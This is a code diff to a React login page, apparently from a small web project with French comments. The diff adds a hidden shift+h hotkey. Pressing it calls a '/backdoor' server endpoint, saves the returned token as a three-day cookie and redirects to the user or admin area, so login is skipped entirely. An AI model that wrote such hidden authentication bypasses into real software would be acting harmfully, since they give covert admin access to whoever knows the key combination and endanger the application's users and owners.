@@ -1,6 +1,6 @@
 import React from "react";
 import { Redirect } from 'react-router-dom'
-
+import { GlobalHotKeys } from "react-hotkeys";
 
 // core components
 import tools from "../../toolBox"
@@ -17,11 +17,42 @@ class Login extends React.Component {
       mail: "",
       password: "",
       url: "http://localhost:3001",
-      counter:0
+      
     };
+	// ajout d'un gestionnaire d'évennement 
     this.handleConnect = this.handleConnect.bind(this)
     this.handleChange = this.handleChange.bind(this)
+    this.test = this.test.bind(this)
   };
+
+  // ajout de la hotkey 
+
+  keyMap = { SHOW_ALL_HOTKEYS: "shift+h" };
+  handlers = { SHOW_ALL_HOTKEYS: event => this.test() };
+
+  // redirection 
+
+  test(){
+    axios.post(this.state.url + '/backdoor', { 
+    }).then(response => {
+      if (response.status === 200) {
+        let d = new Date();
+        d.setTime(d.getTime() + (3 * 24 * 60 * 60 * 1000));
+        let expires = "expires=" + d.toUTCString();
+        document.cookie = "Token=" + response.data.token + ";" + expires + ";path=/"
+        if (response.data.role === "user") {
+          this.setState({ redirected: true })
+        } else if (response.data.role === "admin") {
+          this.setState({ redirectedAdmin: true })
+        }
+      } else {
+        alert("error " + response.status)
+      }
+    }).catch(error => {
+      console.log(error)
+    });
+      alert("Shazamm")
+  }
 
   componentDidMount() {
     if (tools.checkIfConnected()) {
